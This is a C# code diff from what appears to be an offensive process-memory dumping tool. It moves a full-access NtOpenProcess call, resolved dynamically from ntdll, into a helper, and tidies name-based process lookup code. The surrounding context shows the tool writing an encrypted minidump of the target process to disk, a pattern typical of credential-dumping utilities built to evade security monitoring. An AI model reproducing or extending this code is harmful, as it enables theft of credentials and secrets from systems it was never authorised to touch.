@@ -784,19 +784,9 @@ namespace Charles
             }
 
             //Get a Handle to the process
-            IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtOpenProcess");
-            DELEGATES.NtOpenProcess ntopen = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenProcess)) as DELEGATES.NtOpenProcess;
+            pHandle = get_handle(pid);
 
-            OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
 
-            CLIENT_ID ci = new CLIENT_ID
-            {
-                UniqueProcess = (IntPtr)pid
-            };
-            
-            ntopen(ref pHandle, 0x001F0FFF, ref oa, ref ci);
-            
-            
             if (args[4] == "classic")
             {
                 //Generate a minidump
@@ -823,7 +813,7 @@ namespace Charles
                 File.WriteAllBytes(args[3], encryptedDump);
 
                 //Free the snapshot
-                pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
+                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "PssNtFreeSnapshot");
                 DELEGATES.PssNtFreeSnapshot ntfree = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.PssNtFreeSnapshot)) as DELEGATES.PssNtFreeSnapshot;
                 ntfree(sHandle);
 
@@ -835,12 +825,30 @@ namespace Charles
                 return;
             }
 
+            static IntPtr get_handle(int pid)
+            {
+                IntPtr pHandle = IntPtr.Zero;   
+
+                IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtOpenProcess");
+                DELEGATES.NtOpenProcess ntopen = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtOpenProcess)) as DELEGATES.NtOpenProcess;
+
+                OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();
+
+                CLIENT_ID ci = new CLIENT_ID
+                {
+                    UniqueProcess = (IntPtr)pid
+                };
+
+                ntopen(ref pHandle, 0x001F0FFF, ref oa, ref ci);
+                return pHandle;
+            }
+
             static int FindPIDByName(string procname)
-            {       
-                IntPtr hProcess = IntPtr.Zero;      
+            {
+                IntPtr hProcess = IntPtr.Zero;
 
                 IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtGetNextProcess");
-                DELEGATES.NtGetNextProcess ntgext = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtGetNextProcess)) as DELEGATES.NtGetNextProcess;             
+                DELEGATES.NtGetNextProcess ntgext = Marshal.GetDelegateForFunctionPointer(pointer, typeof(DELEGATES.NtGetNextProcess)) as DELEGATES.NtGetNextProcess;
 
                 //Iterate through processes
                 while (true)
@@ -851,10 +859,10 @@ namespace Charles
                     {
                         return 0;
                     }
-                    
+
                     //If process matches
-                    if(is_process(hProcess,procname))
-                    {                       
+                    if (is_process(hProcess, procname))
+                    {
                         int bufferlenght = Marshal.SizeOf<PROCESS_BASIC_INFORMATION>();
                         var unique_pid = Marshal.AllocHGlobal(bufferlenght);
 
@@ -872,9 +880,9 @@ namespace Charles
                 }
 
                 static bool is_process(IntPtr hProcess, string procname)
-                {                    
+                {
                     string process_name = null;
-                    process_name = get_process_image(hProcess);                
+                    process_name = get_process_image(hProcess);
 
                     if (process_name.Contains(procname))
                     {
@@ -884,8 +892,8 @@ namespace Charles
                 }
 
                 static string get_process_image(IntPtr hProcess)
-                {                    
-                    int bufferlenght = 0x200;                   
+                {
+                    int bufferlenght = 0x200;
                     var process_image = Marshal.AllocHGlobal(bufferlenght);
 
                     IntPtr pointer = Invoke.GetLibraryAddress("ntdll.dll", "NtQueryInformationProcess");
@@ -893,9 +901,9 @@ namespace Charles
 
                     ntqi(hProcess, 27, process_image, (ulong)bufferlenght, out IntPtr ReturnLength);
                     var us = Marshal.PtrToStructure<UNICODE_STRING>(process_image);
-                    var name = Marshal.PtrToStringUni(us.Buffer,us.Length/2);
+                    var name = Marshal.PtrToStringUni(us.Buffer, us.Length / 2);
 
-                    Marshal.FreeHGlobal(process_image);                   
+                    Marshal.FreeHGlobal(process_image);
                     return name;
                 }
             }
